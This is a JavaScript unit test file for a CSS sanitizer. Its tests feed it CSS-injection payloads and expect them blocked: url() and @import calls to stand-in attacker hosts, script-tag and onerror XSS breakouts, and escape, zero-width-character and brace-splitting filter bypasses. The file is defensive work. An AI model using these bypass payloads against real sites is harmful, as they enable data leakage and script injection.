import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { sanitizeCSS } from '../utils/sanitize-css'

describe('sanitizeCSS', () => {
  it('allows safe standard CSS declarations', () => {
    const input = 'background-color: #1a0a2e; color: #f5f0e8; border-radius: 8px;'
    const output = sanitizeCSS(input)
    assert.equal(output, input)
  })

  it('strips curly braces to prevent selector breakout', () => {
    const input = 'body { display: none; } p { color: red; }'
    const output = sanitizeCSS(input)
    assert.equal(output, 'body  display: none;  p  color: red; ')
    assert.equal(output.includes('{'), false)
    assert.equal(output.includes('}'), false)
  })

  it('blocks javascript: pseudo-protocol', () => {
    const input = 'background: javascript:alert(1);'
    assert.equal(sanitizeCSS(input), '')
  })

  it('blocks @import rules', () => {
    const input = '@import url("https://evil.com/style.css");'
    assert.equal(sanitizeCSS(input), '')
  })

  it('blocks @font-face rules', () => {
    const input = '@font-face { font-family: Evil; src: url(...); }'
    assert.equal(sanitizeCSS(input), '')
  })

  it('blocks fixed, sticky, and absolute position exploits', () => {
    assert.equal(sanitizeCSS('position: fixed; top: 0;'), '')
    assert.equal(sanitizeCSS('position: absolute; left: 0;'), '')
    assert.equal(sanitizeCSS('position: sticky; top: 0;'), '')
  })

  it('blocks z-index manipulation', () => {
    assert.equal(sanitizeCSS('z-index: 9999;'), '')
  })

  it('blocks url() functions', () => {
    assert.equal(sanitizeCSS('background-image: url("https://attacker.com/leak");'), '')
  })

  it('blocks HTML tag injection characters < and >', () => {
    assert.equal(sanitizeCSS('</style><script>alert(1)</script>'), '')
    assert.equal(sanitizeCSS('<img src=x onerror=alert(1)>'), '')
  })

  it('blocks CSS comments to avoid comment-based parsing bypasses', () => {
    assert.equal(sanitizeCSS('/* comment */ color: red;'), '')
  })

  it('blocks CSS backslash escape sequences and unicode bypasses', () => {
    assert.equal(sanitizeCSS('background: \\75rl(https://attacker.com/leak);'), '')
    assert.equal(sanitizeCSS('\\70osition: \\66ixed; top: 0;'), '')
    assert.equal(sanitizeCSS('\\@import \\75rl(style.css);'), '')
  })

  it('enforces maximum character length of 2000', () => {
    const longCSS = 'color: red; '.repeat(200)
    assert.ok(longCSS.length > 2000)
    assert.equal(sanitizeCSS(longCSS), '')
  })

  describe('post-check reconstruction bypass (Production Audit III)', () => {
    // The blacklist used to run BEFORE brace-stripping. Since stripping `{}`
    // removes characters rather than rearranging them, an attacker could
    // split a blocked keyword around a pair of braces -- the raw input
    // matches no pattern, but the *sanitized* output reassembles the exact
    // keyword the filter was supposed to block.
    it('blocks url() reconstructed by splitting it with braces', () => {
      const input = 'background:u{}rl(https://attacker.example/track.png)'
      assert.equal(sanitizeCSS(input), '')
    })

    it('blocks @import reconstructed by splitting it with braces', () => {
      const input = '@{}import url(https://attacker.example/x.css);'
      assert.equal(sanitizeCSS(input), '')
    })

    it('blocks javascript: reconstructed by splitting it with braces', () => {
      const input = 'background:java{}script:alert(1)'
      assert.equal(sanitizeCSS(input), '')
    })

    it('blocks url() reconstructed via zero-width space', () => {
      const zwsp = String.fromCharCode(0x200b)
      const input = `background:u${zwsp}rl(https://attacker.example/x.png)`
      assert.equal(sanitizeCSS(input), '')
    })

    it('blocks -moz-binding reconstructed via zero-width non-joiner', () => {
      const zwnj = String.fromCharCode(0x200c)
      const input = `behavior:none;-moz${zwnj}-binding:url(x.xml)`
      assert.equal(sanitizeCSS(input), '')
    })

    it('still allows ordinary declarations containing harmless braces once stripped', () => {
      assert.equal(sanitizeCSS('color:red;}body{color:blue'), 'color:red;bodycolor:blue')
    })
  })

  describe('post-hardening adversarial re-audit (Post-Hardening Verification pass)', () => {
    it('blocks url() split by both braces and a zero-width space in the same payload', () => {
      const zwsp = String.fromCharCode(0x200b)
      assert.equal(sanitizeCSS(`u{}${zwsp}rl(https://evil.example/x)`), '')
    })

    it('blocks a CSS comment reconstructed by splitting /* with braces', () => {
      assert.equal(sanitizeCSS('/{}* color:red */ background:red'), '')
    })

    it('blocks </style> breakout reconstructed by splitting < and > with braces', () => {
      assert.equal(sanitizeCSS('{<}/style{>}<script>alert(1)</script>'), '')
    })

    it('blocks -moz-element() (Firefox DOM-content-into-CSS exfiltration primitive)', () => {
      assert.equal(sanitizeCSS('background: -moz-element(#csrf-token-field)'), '')
    })

    it('a bare data: URI without url() passes the filter, but is inert: CSS resource properties require url(), which stays blocked', () => {
      // Documents the finding rather than "fixing" a non-exploitable path:
      // `background: data:...` is not valid CSS (data: URIs only function
      // inside url()), so this string reaching the DOM has no effect.
      const out = sanitizeCSS('background: data:text/plain;base64,SGVsbG8=')
      assert.equal(out, 'background: data:text/plain;base64,SGVsbG8=')
      assert.equal(/url\s*\(/i.test(out), false)
    })
  })
})
